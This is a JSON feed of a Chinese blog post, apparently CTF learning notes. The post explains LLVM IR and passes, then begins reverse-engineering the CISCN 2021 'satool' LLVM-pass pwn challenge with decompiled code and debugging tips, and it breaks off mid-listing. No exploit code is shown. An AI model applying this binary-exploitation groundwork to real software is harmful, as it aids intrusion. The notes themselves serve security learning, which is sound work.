{
    "version": "https://jsonfeed.org/version/1",
    "title": "我他喵的 • All posts by \"learning\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "http://example.com/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "vm学习笔记",
            "date_published": "2022-06-11T11:28:16.000Z",
            "content_html": "<h1 id=\"vmlearning-笔记\"><a class=\"markdownIt-Anchor\" href=\"#vmlearning-笔记\">#</a> vmlearning 笔记</h1>\n<p>首先清楚什么是 vm，虚拟机器，一种实现不同架构的程序的解释性的软件程序。virtual machine</p>\n<p>关于 vmpass 这种解释性的程序，工作原理是根据不同的 cou 架构，不同的程序会生成不同的机器语言代码，指令代码。这个中间文件称作 IR，一般有两种形式 ——bitcode, 二进制机器码，以及.ll 文件，后者是为了方便我们阅读的，可读性较高。</p>\n<p>vmpass 程序，对于我们提供的想要模拟运行的代码，我们需要提供类似于指令代码程序的文件，.ll 或者 bc 文件，而文件是被 assmebly 后的，所以里面会有相关的汇编指令（机器代码指令）的二进制代码。那么我们知道对于一台机器，其所能实现的操作是固定的，不同的编程语言，程序，最终都会被解释为一条条的机器指令，利用组成原理的知识，一条机器指令代码，需要有操作码以及操作数，有的时候需要寄存器，而且程序的运行必然会利用到一些判断标志，c,z 等等。这些都会被形象的存储在数组中。比如寄存器数组就会对应不同的寄存器，里面记录数据，提供’cpu’使用。而字符串也会被拆开，每个字符变为 16 进制数储存。（小端序，倒着看的字符串）</p>\n<p>0x72306F446B633442LL  ===&gt;&gt; ‘r0oDkc4B’   ===&gt;&gt;“B4ckD0or”</p>\n<p>关于 vm 的机制，后面再慢慢学习。</p>\n<h2 id=\"ir代码\"><a class=\"markdownIt-Anchor\" href=\"#ir代码\">#</a> IR 代码</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MjA2MTA1L2FydGljbGUvZGV0YWlscy8xMTUyNzQyNDE/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjU0OTYwODk0MTY3ODE2ODM5MjIwNzclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPTE2NTQ5NjA4OTQxNjc4MTY4MzkyMjA3NyZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTE1Mjc0MjQxLW51bGwtbnVsbC4xNDIlNUV2MTMlNUVjb250cm9sLDE1NyU1RXYxNCU1RWNvbnRyb2wmYW1wO3V0bV90ZXJtPUlSJUU1JUI4JUI4JUU4JUE3JTgxJUU3JTlBJTg0JUU2JTkzJThEJUU0JUJEJTlDJUU2JThDJTg3JUU0JUJCJUE0JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">参考资料</span></p>\n<p>IR 是一种中间产物，看了一理解位是对程序代码的指令化解析，而且适用于我们可以看懂的，可以理解位 llvm 下的汇编代码。bitcode 是纯二进制代码文件。</p>\n<p>简单的学习下</p>\n<p>源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a= <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b=<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c = a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> d=<span class=\"number\">1</span>+a;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>IR 代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; ModuleID = <span class=\"string\">&#x27;test.c&#x27;</span></span><br><span class=\"line\">source_filename = <span class=\"string\">&quot;test.c&quot;</span></span><br><span class=\"line\">target datalayout = <span class=\"string\">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class=\"line\">target triple = <span class=\"string\">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class=\"line\">define i32 @main() <span class=\"comment\">#0 &#123;</span></span><br><span class=\"line\">  %<span class=\"number\">1</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">2</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">3</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">4</span> = alloca i32, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">2</span>, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 <span class=\"number\">3</span>, i32* %<span class=\"number\">2</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">5</span> = load i32, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  store i32 %<span class=\"number\">5</span>, i32* %<span class=\"number\">3</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">6</span> = load i32, i32* %<span class=\"number\">1</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  %<span class=\"number\">7</span> = add nsw i32 <span class=\"number\">1</span>, %<span class=\"number\">6</span></span><br><span class=\"line\">  store i32 %<span class=\"number\">7</span>, i32* %<span class=\"number\">4</span>, align <span class=\"number\">4</span></span><br><span class=\"line\">  ret i32 <span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">attributes <span class=\"comment\">#0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">!llvm.module.flags = !&#123;!<span class=\"number\">0</span>&#125;</span><br><span class=\"line\">!llvm.ident = !&#123;!<span class=\"number\">1</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">!<span class=\"number\">0</span> = !&#123;i32 <span class=\"number\">1</span>, !<span class=\"string\">&quot;wchar_size&quot;</span>, i32 <span class=\"number\">4</span>&#125;</span><br><span class=\"line\">!<span class=\"number\">1</span> = !&#123;!<span class=\"string\">&quot;clang version 6.0.0-1ubuntu2 (tags/RELEASE_600/final)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>我们重点关注函数部分。开头是文件的一些信息，文件名，类型，等等。</p>\n<p>函数，define 定义一个函数，接着 i32 表示函数的返回值是 32 位的（这里我们定义的是 int）。alloca 大概就是谁年轻一个变量的空间。变量用数字做标识，按照先后顺序。% 加上一个数字就表示的是第几个变量，同样的 i32 说明变量是 32 位。align 则是说明变量在内存中 4 字节对齐。</p>\n<p>我们知道函数名在程序内存中是一个全局的符号，我们如何表示？@用于表示全局的标识，包括函数名以及全局变量。特别说明，区别函数与变量的方法是二者的定义形式不一样。函数使用 define 关键字。</p>\n<p>% 除了用于标识局部变量还用于标识寄存器。</p>\n<p>（后续继续补充）</p>\n<p>** 关于是否需要完全掌握 IR，其实还是需要根据本题目，有的题目需要对 IR 进行优化，从而达到对源代码程序的优化。</p>\n<p>​\t\t\t有的题目和 IR 代码高度相关的那就得看懂吧！\t\t\t\t\t\t\t\t\t\t\t\t\t——ayaka</p>\n<h2 id=\"ctf\"><a class=\"markdownIt-Anchor\" href=\"#ctf\">#</a> ctf</h2>\n<p>直接进入解题，vmpass 提供用户一整套完整的流程，包括库，vmpass 基于 c++ 编写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Pass.h&quot;</span><span class=\"comment\">//写Pass所必须的库</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/Function.h&quot;</span><span class=\"comment\">//操作函数所必须的库</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Support/raw_ostream.h&quot;</span><span class=\"comment\">//打印输出所必须的库</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>程序中我们需要注册一些相关的内容，opt 操作，以及 clang 所需要的对象。</p>\n<h2 id=\"ciscn2021-satool\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2021-satool\">#</a> ciscn2021 satool</h2>\n<p>一般来说 LLVM PASS pwn 都是对函数进行 PASS 操作，所以我们首先要找到 runOnFunction 函数时如何重写的，一般来说 runOnFunction 都会在函数表最下面。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D20                 ;org <span class=\"number\">203</span>D20h</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D20 ; `vtable <span class=\"keyword\">for</span><span class=\"number\">&#x27;</span>`anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D20 _ZTVN12_GLOBAL__N_16SAPassE dq <span class=\"number\">0</span>        ; offset to this</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D28                 dq offset _ZTIN12_GLOBAL__N_16SAPassE ; `typeinfo <span class=\"keyword\">for</span><span class=\"number\">&#x27;</span>`anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D30 off_203D30      dq offset _ZN4llvm4PassD2Ev</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D30                                         ; DATA XREF: sub_1930+<span class=\"number\">32</span>↑o</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D30                                         ; llvm::Pass::~Pass()</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D38                 dq offset sub_1990</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D40                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D48                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D50                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D58                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module <span class=\"type\">const</span>*)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D60                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,<span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"type\">char</span>&gt;&gt; <span class=\"type\">const</span>&amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D68                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D70                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D78                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D80                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D88                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D90                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(<span class=\"type\">void</span> <span class=\"type\">const</span>*)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>D98                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DA0                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DA8                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(<span class=\"type\">void</span>)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DB0                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DB8                 dq offset runonfunction\t\t<span class=\"comment\">//这里我进行了重命名</span></span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DC0 ; public `anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br><span class=\"line\">.data.rel.ro:<span class=\"number\">0000000000203</span>DC0 ; `typeinfo <span class=\"keyword\">for</span><span class=\"number\">&#x27;</span>`anonymous namespace<span class=\"number\">&#x27;</span>::SAPass</span><br></pre></td></tr></table></figure>\n<p>再程序的开始 start 会有一些函数名注册，一般不需要搭理。我们重点关注的还是程序如何解释运行程序 ——runOnFunction</p>\n<p>函数里面最开始一定是 getname, 这个就是获取函数名称的，没有什么意义。</p>\n<p>如何调试？</p>\n<p>_一般情况下，题目会指定使用的 opt 加载，或者给出，这道题使用的 opt-8，对应的是 llvm-8。要提一句的是，不同的题目需要的 llvm 版本不同，需要切换，ubuntu18 最高支持的是 llvm-10。接着，我们如何确定断点？我们分析的是 pass.so 的文件，所以如果想断点，就是 offset+vmpass.so 的第一个地址。_但是程序并不是一开始就会加载 pass.so，但是地址应该是有相对固定的偏移，距离 libtinfo.so.5.9 偏移是固定的，就是其低 2 字节。解决办法，利用 compare 函数来定位，compare 会先比较 B4ckD0or，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1wYXNzLWtmNWY0c2UyZzU3Z3ozems2ZDN4MWE5ZTJlYmwzYnViYi5zbw==\">这个时候就已经加载了 pass.so</span>。</p>\n<p>回到题目，llvmpass pwn 的一个非常重要的电视，因为属于软件思想模拟一个 cpu 架构，所以每次对于我们提供的代码的操作都是种循环。而且因为是 c++ 编写的 so 库，往往会有很多不重要的检查，这些往往是很好辨认的，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">        <span class=\"keyword\">if</span> ( !(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)<span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"type\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"type\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"type\">char</span>&gt;&gt;::compare(</span><br><span class=\"line\">                              &amp;v89,</span><br><span class=\"line\">                              <span class=\"string\">&quot;save&quot;</span>) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v17 = *((_BYTE *)v8 + <span class=\"number\">16</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v17 == <span class=\"number\">79</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v18 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v17 != <span class=\"number\">29</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v16);</span><br><span class=\"line\">LABEL_139:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v36);</span><br><span class=\"line\">LABEL_140:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v63);</span><br><span class=\"line\">LABEL_141:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v67);</span><br><span class=\"line\">LABEL_142:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v78);</span><br><span class=\"line\">LABEL_143:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)v20);</span><br><span class=\"line\">LABEL_144:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)v24);</span><br><span class=\"line\">LABEL_154:</span><br><span class=\"line\">              __assert_fail(</span><br><span class=\"line\">                <span class=\"string\">&quot;i &lt; getNumArgOperands() &amp;&amp; \\&quot;Out of bounds!\\&quot;&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                <span class=\"number\">0x470</span>u,</span><br><span class=\"line\">                <span class=\"string\">&quot;llvm::Value *llvm::CallBase::getArgOperand(unsigned int) const&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            v18 = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          v19 = llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - <span class=\"number\">3</span>));</span><br><span class=\"line\">          v20 = (<span class=\"type\">char</span> *)&amp;v8[<span class=\"number\">-3</span> * (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>)];</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( <span class=\"number\">-1431655765</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((<span class=\"type\">unsigned</span> __int64)((<span class=\"type\">char</span> *)&amp;v15[<span class=\"number\">3</span> * v18 + <span class=\"number\">-3</span> * v19] - v20) &gt;&gt; <span class=\"number\">3</span>) == <span class=\"number\">2</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v21 = *((_BYTE *)v8 + <span class=\"number\">16</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v21 == <span class=\"number\">79</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v22 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ( v21 != <span class=\"number\">29</span> )</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> LABEL_143;</span><br><span class=\"line\">              v22 = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            v23 = (__int64)&amp;v15[<span class=\"number\">3</span> * v22</span><br><span class=\"line\">                              + <span class=\"number\">-3</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - <span class=\"number\">3</span>))];</span><br><span class=\"line\">            v24 = &amp;v8[<span class=\"number\">-3</span> * (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>)];</span><br><span class=\"line\">            <span 